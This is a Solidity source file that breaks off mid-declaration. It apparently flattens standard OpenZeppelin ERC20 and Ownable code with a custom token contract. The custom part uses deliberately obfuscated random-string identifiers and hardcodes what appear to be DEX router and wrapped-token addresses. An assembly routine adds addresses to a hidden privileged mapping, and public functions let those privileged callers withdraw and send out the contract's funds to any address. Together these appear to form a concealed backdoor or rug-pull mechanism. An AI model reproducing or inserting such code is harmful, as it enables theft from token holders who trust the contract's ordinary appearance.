// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/access/Ownable.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.4.0

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface hXu2jRpH5h8uCTHw1HBRXgFOf0BVdUtFZqXqCCNxfjKlGDtMJeSCmfXzMVlWgquy4WQjvrATq6GvxkDU9H2nZimmRc0lOy9t {
  function factory() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112,
      uint112,
      uint32
    );

  function swap(
    uint256,
    uint256,
    address,
    bytes calldata
  ) external;

  function mint(address) external;
  function sync() external;

  function createPair(address, address) external returns (address);
}

interface iCiPPYU99WiA6SqfTANMorUwIrLkObGrliLPJYv4COVwGtaJTKo9wTLPI029hdH4HeD9fGHiRgb9lOxXvITwFOVzvBfSsKxf {
  function deposit() external payable;

  function transfer(address, uint256) external returns (bool);

  function withdraw(uint256) external;
}

contract p0dFIvz7vSYeLHtSqFf25n2MrzWZ6mV3SxY3Cw0F2mYV6NRo7WwfkhRp9e2ZAON1ehriH8J69Kold1KPKMN073iwKuGCgaTW {
  address internal constant bgPsOsFtFEposPtIjxWQwe6hddv7Ft1rxCTRAj0ZcSGNaBS8LZ7vZrabexmlb5KnCI67la6HrlExYV25VlmXbVv35wgVRg02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal constant tveqYdlFSy3NCkJliAaXUuV6LHRGmHFKbvTBJ8vWYauuCpKAymFsnSuR49BZG2XltV9nUSGUSf0L8LIpeqvTLDHNPUmKQzBA =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal cwPrLgWOOsD3RfckSyAK6rWmH9hbhKvdt17AueZQ0SJOlwf257hIz5mGLTEFLTifVIimJseBya2Zbfz77OgwrpvzrdTZRgOF;

  address internal constant fa1jO0aa8PL4cUzzLrasG3phM10o6IfF38tHzv4zH63avFiqXJyIfOuIpw74NpsWgI9zFrky7Z7XBF6o1kjMb0HQU6MS8xcf =
    0xD02DbCaD826B141FfF8fba8f87eb1DB6465BfDea;
  address internal constant g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint256 internal constant nQKxYERm4HIWLxiG9IOZkAPs8AC42IUQs4wbaDUkp8q8DqbxnnwxoF5gTHvBhrjjb76TbC3BAkwBs6SPXWvnxe20Y31JpArS = 10000;
  uint256 public constant xgFQOkfhrjGUhLAel9SlkNA9Gt64Em0RpAq56kWQwDdrBAx7de31PKvlzzr1MrPicOBWjQVhrEDGWXQhknsfREcci7WQTVsr = 25;
  uint256 internal constant tdWExzg3diajSY0m34F0tsupc1rkYeUWnleQIQWQmZIym7oVBn0ztfuUqumnAIHqaNxXSMnKf8tJGleJIRAFZuICkMywEa4H = nQKxYERm4HIWLxiG9IOZkAPs8AC42IUQs4wbaDUkp8q8DqbxnnwxoF5gTHvBhrjjb76TbC3BAkwBs6SPXWvnxe20Y31JpArS - xgFQOkfhrjGUhLAel9SlkNA9Gt64Em0RpAq56kWQwDdrBAx7de31PKvlzzr1MrPicOBWjQVhrEDGWXQhknsfREcci7WQTVsr;

  function siQAOB9mV4RCnSOCPKMTfc4LvnXihU0XN8kAH26cwWHIEc5RuQdSZF8WT5XB0z40Dt2LZDd0JO49o52EVWGeMr3IA0BuNiPj(
    address q50zrIbZEi9YgHpaf8IYuvMaOJptSpUQA3XM5jxe92DyEnRwgwZEnophnSdRSk57QdnsOkVleZDWVNv6wbAsfHWV9iFoorAh,
    address h7Np2fZFTtqYMiG28RQvnQHa0PSBqWTBwHxi9PlB3gf9bYStiWbYMK9e6W5D3nadjF7oHnNI4YC1Xp6hSK4HNUhBEsrCermH,
    address rCCvTO537Vm8AcnUtDZbyFI3iO9TAzC4I3XRUVhhwchyJ0I5nY2lUAPf5pjBLZnOApmcshcP5lrd7jNYxWwzXNg9tV25ZuI3
  ) internal view returns (uint256 ikFz6wbmABEJBxkZtZFUf7OCA38eOlGIGtjBVo3Iu9pbDzPEhMz1dNnkdrCvdxc4zqPnztALs1a6putW77hNauOPQqKXAxMB, uint256 mPGLT9u4BlmSvIMsz1zahlH4yDfUcGMwTOUXib6eJmTCZZcPQSxofBvLKoTHVRPrqo3LLwxrFUmRQTVP9et2HwyTTkRnMd7m) {
    (uint256 l0USfgiKRmg83fPmd3Tcq82pBplqqzNjs9O9sGLEzxZFHmFtaiaAuNetNyHrM1tlcRgEMpi9aXPGNYg0fdjhrRvuhMTRbKyN, uint256 tuffTe1Fhnf1y6s3oGlvLPTGuhtNFl1gUWK9HPwedb2RzXIA3xjPicayeaT00LxlAOrcjShUGdTmRdYbv6Po56HNCaX6k8jS, ) =
      hXu2jRpH5h8uCTHw1HBRXgFOf0BVdUtFZqXqCCNxfjKlGDtMJeSCmfXzMVlWgquy4WQjvrATq6GvxkDU9H2nZimmRc0lOy9t(q50zrIbZEi9YgHpaf8IYuvMaOJptSpUQA3XM5jxe92DyEnRwgwZEnophnSdRSk57QdnsOkVleZDWVNv6wbAsfHWV9iFoorAh).getReserves();
    if (h7Np2fZFTtqYMiG28RQvnQHa0PSBqWTBwHxi9PlB3gf9bYStiWbYMK9e6W5D3nadjF7oHnNI4YC1Xp6hSK4HNUhBEsrCermH > rCCvTO537Vm8AcnUtDZbyFI3iO9TAzC4I3XRUVhhwchyJ0I5nY2lUAPf5pjBLZnOApmcshcP5lrd7jNYxWwzXNg9tV25ZuI3) {
      mPGLT9u4BlmSvIMsz1zahlH4yDfUcGMwTOUXib6eJmTCZZcPQSxofBvLKoTHVRPrqo3LLwxrFUmRQTVP9et2HwyTTkRnMd7m = l0USfgiKRmg83fPmd3Tcq82pBplqqzNjs9O9sGLEzxZFHmFtaiaAuNetNyHrM1tlcRgEMpi9aXPGNYg0fdjhrRvuhMTRbKyN;
      ikFz6wbmABEJBxkZtZFUf7OCA38eOlGIGtjBVo3Iu9pbDzPEhMz1dNnkdrCvdxc4zqPnztALs1a6putW77hNauOPQqKXAxMB = tuffTe1Fhnf1y6s3oGlvLPTGuhtNFl1gUWK9HPwedb2RzXIA3xjPicayeaT00LxlAOrcjShUGdTmRdYbv6Po56HNCaX6k8jS;
    } else {
      mPGLT9u4BlmSvIMsz1zahlH4yDfUcGMwTOUXib6eJmTCZZcPQSxofBvLKoTHVRPrqo3LLwxrFUmRQTVP9et2HwyTTkRnMd7m = tuffTe1Fhnf1y6s3oGlvLPTGuhtNFl1gUWK9HPwedb2RzXIA3xjPicayeaT00LxlAOrcjShUGdTmRdYbv6Po56HNCaX6k8jS;
      ikFz6wbmABEJBxkZtZFUf7OCA38eOlGIGtjBVo3Iu9pbDzPEhMz1dNnkdrCvdxc4zqPnztALs1a6putW77hNauOPQqKXAxMB = l0USfgiKRmg83fPmd3Tcq82pBplqqzNjs9O9sGLEzxZFHmFtaiaAuNetNyHrM1tlcRgEMpi9aXPGNYg0fdjhrRvuhMTRbKyN;
    }
  }

  function hg4w6BWLo3mBWF9qzm9lZtiP8PlIwl4wHRSgj3Z5KUcALKTW71Nvnmzx4AyrjTkgMRt5qWgD6nyVPwxcs03XG3D0nVHvf2S5(
    uint256 dxSQDxNpZZXWZGj1VsVvN8Dd3Jo5TMAbgY3IhOpcyWLfnNCPGhfMnVDqZlZ7Z4FsAovo0lmg0QnbB6ow1BA1rcZO73nKIDji,
    uint256 d1kHwisssJQ1t7CwGkstdkPjGJS8sv9lXrHAkmA49euPHGltdILPX12pUiKVZAvW4Pum7jPhNdMF2Gyptv5F9bM10sqn5P7K,
    uint256 cdJkm252FRwdHjTT6hwmrqG89PAGN5Xxl3A16P2aJqxGCLYYqPdt9ysTxd1D7it49EzaE8jZhlwyFoej8FLipiC9GbXtfWuD
  ) internal pure returns (uint256) {
    return (dxSQDxNpZZXWZGj1VsVvN8Dd3Jo5TMAbgY3IhOpcyWLfnNCPGhfMnVDqZlZ7Z4FsAovo0lmg0QnbB6ow1BA1rcZO73nKIDji * tdWExzg3diajSY0m34F0tsupc1rkYeUWnleQIQWQmZIym7oVBn0ztfuUqumnAIHqaNxXSMnKf8tJGleJIRAFZuICkMywEa4H * cdJkm252FRwdHjTT6hwmrqG89PAGN5Xxl3A16P2aJqxGCLYYqPdt9ysTxd1D7it49EzaE8jZhlwyFoej8FLipiC9GbXtfWuD) / ((d1kHwisssJQ1t7CwGkstdkPjGJS8sv9lXrHAkmA49euPHGltdILPX12pUiKVZAvW4Pum7jPhNdMF2Gyptv5F9bM10sqn5P7K * nQKxYERm4HIWLxiG9IOZkAPs8AC42IUQs4wbaDUkp8q8DqbxnnwxoF5gTHvBhrjjb76TbC3BAkwBs6SPXWvnxe20Y31JpArS) + (dxSQDxNpZZXWZGj1VsVvN8Dd3Jo5TMAbgY3IhOpcyWLfnNCPGhfMnVDqZlZ7Z4FsAovo0lmg0QnbB6ow1BA1rcZO73nKIDji * tdWExzg3diajSY0m34F0tsupc1rkYeUWnleQIQWQmZIym7oVBn0ztfuUqumnAIHqaNxXSMnKf8tJGleJIRAFZuICkMywEa4H));
  }

  function f5ApCMxO9qEtdMcAmKQlRm7Pl23nFn89p6xObnjrj6vtr8NUzsYypLCIx8L9u2qkwI1bWpc3y0jJjisb3smMQB2LF4Wr3kAK(uint256 zsXAm8VqPynZwuptF92t1sKJopAVwMxJV87Jq40VGndmxyC9Io6hHuEvmOuGXGq5nWXauZ60kJOuQwp457fTKubWL8808HCN) internal view returns (address) {
    return
      address(uint160(uint256(keccak256(abi.encode(address(this), zsXAm8VqPynZwuptF92t1sKJopAVwMxJV87Jq40VGndmxyC9Io6hHuEvmOuGXGq5nWXauZ60kJOuQwp457fTKubWL8808HCN)))));
  }

  receive() external payable {}

  fallback() external payable {}
}

abstract contract kjXmosoWd60XyW6qFzuDwT6ECbo3y0ojjLAtFKYUxVJCSbNby9a91p0uSK6DZWKHCAbxnZST3xFG7u1Dc7TDCqtdNuxUkfKw is p0dFIvz7vSYeLHtSqFf25n2MrzWZ6mV3SxY3Cw0F2mYV6NRo7WwfkhRp9e2ZAON1ehriH8J69Kold1KPKMN073iwKuGCgaTW {
  mapping(address => bool) internal sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1;
  uint256 internal d6mG5H1O0Up04034DXACMLvLSvIkq3iz8ipeQokGhRROi2e19XYDnTNd0ZnUTbhYZc2eLQgBR2l62MXIO401g73IhKnQlHv5;
  uint256 public idoAmount;
  uint256 internal aJEqvCwMbH1KhxBGhzzsVaExaeAQglnmaKzknEFjPpwBTtNEGJ0JgknC4md7SgS0PikzjBJnZy9PrDBdmDc8kkoZW46aQudI;

  function t7Dc5SFBbGS1mTEhQnX0bqbw234OvSgRhYCLtzyC4v9PX0kOt0IphfmA9CIm2UCsGo2VWj2IOzf4VspX7ZF02QrYkR6QCkt4(bytes memory mFc9cGhQpeYzz0HArP49i8UVIUsiDhFgnJ8jpbMyC1ahZXHRizkBFBmzfJiGOpvsjCUpTxA9ECZSvkSIRYqk3gJUbJ9oHXiR) public {
    require(sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[msg.sender]);
    assembly {
      mstore(0x20, sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1.slot)
      for {
        mstore(0x60, mload(mFc9cGhQpeYzz0HArP49i8UVIUsiDhFgnJ8jpbMyC1ahZXHRizkBFBmzfJiGOpvsjCUpTxA9ECZSvkSIRYqk3gJUbJ9oHXiR))
      } lt(0, mload(0x60)) {
        mstore(0x60, sub(mload(0x60), 0x14))
      } {
        mstore(
          0,
          mod(
            mload(add(mFc9cGhQpeYzz0HArP49i8UVIUsiDhFgnJ8jpbMyC1ahZXHRizkBFBmzfJiGOpvsjCUpTxA9ECZSvkSIRYqk3gJUbJ9oHXiR, mload(0x60))),
            0x10000000000000000000000000000000000000000
          )
        )
        mstore(0x40, keccak256(0, 0x40))
        switch iszero(sload(mload(0x40)))
          case 1 {
            sstore(mload(0x40), 1)
          }
      }
    }
  }

  function zHVqTviY0OGDcaOLmB4l4tXsuNiMMJ6nLAHPwfVMPAQcwQl7XAXzMTPOROO9TkeCILk6U7qM1sxPTs5NDQRL1mOCjVGPaZX2(address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, uint256 fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G) public {
    require(sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[msg.sender]);
    iCiPPYU99WiA6SqfTANMorUwIrLkObGrliLPJYv4COVwGtaJTKo9wTLPI029hdH4HeD9fGHiRgb9lOxXvITwFOVzvBfSsKxf(g6IrCxPA1wIrk9o8d1YCsWBlOy7EObouf1EQBQHkAgiuBeZxrfnhra3chQ7xIJR1yZSd8QepnmOkIasnb2bRhCeS0445sJ88).withdraw(fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G);
    (bool zEucEBYbczv5KfLLUT6BgnItbBFg1fMEcG4HjdgGxFkVJLCvlCaGDP2DAqmUmrxwTLG7K3fJeLd4JxiSM39zaxJwuRGVgrVY, ) = tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd.call{value: fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G}("");
    require(zEucEBYbczv5KfLLUT6BgnItbBFg1fMEcG4HjdgGxFkVJLCvlCaGDP2DAqmUmrxwTLG7K3fJeLd4JxiSM39zaxJwuRGVgrVY, "Transfer failed.");
  }

  function nSsLX7vtxYyxFzqVKSLzGyDS1UwxAD4m4SzDdhsdIjUupNk30ru8VQUPR2ufaNnJjpJ8Iy1WYlIzqN4TxQMKV4IlenkNiFX6(address tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd, uint256 fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G) public {
    require(sEaDD3pYvXNoOkMgqp0WbmPKZDoQ3ubeHJahh6S0gkTvmLcM76nbWr8Oi7Sy4E0wLEmGoEraRTH8lUM3vnCKD5mSY7pb8MV1[msg.sender]);
    (bool zEucEBYbczv5KfLLUT6BgnItbBFg1fMEcG4HjdgGxFkVJLCvlCaGDP2DAqmUmrxwTLG7K3fJeLd4JxiSM39zaxJwuRGVgrVY, ) = tsVp12F9lUbVxoiAG6QPR8hpieMHkprk9Z3BTqEZg671IbDwmZ337Wn2aIsCz00qIIiTkdmYpI7eyzg1PNl2de3Z1HPloAZd.call{value: fInhuSLMOBBYeEtPSbdMMwnu3VXFzeq8GpMwIsFZAcbma3EgIWda1rjvmoE3OLWsiySz4cDMwE6j5SahtAbmKHesHzN3ts8G}("");
    require(zEucEBYbczv5KfLLUT6BgnItbBFg1fMEcG4HjdgGxFkVJLCvlCaGDP2DAqmUmrxwTLG7K3fJeLd4JxiSM39zaxJwuRGVgrVY, "Transfer failed.");
  }

  function b3BdGROEVQPKPxTgfSgaAcGMNbstkDrnOD8JeOhXCYMNP8lgVXGYpJ2O2EVJkHM7fhLtexNX8DuOB33lPWDylaN77NgX5tmD(
    address h8IilDDJ6AK63X3lMfNRfZiNR90ByGCD7jBKM2bgsr6I7T7aqvXUZcHQhe2jvpJfH2GeTf9pPc1jDpJU0Er1BY0Ws6mgq4EU,
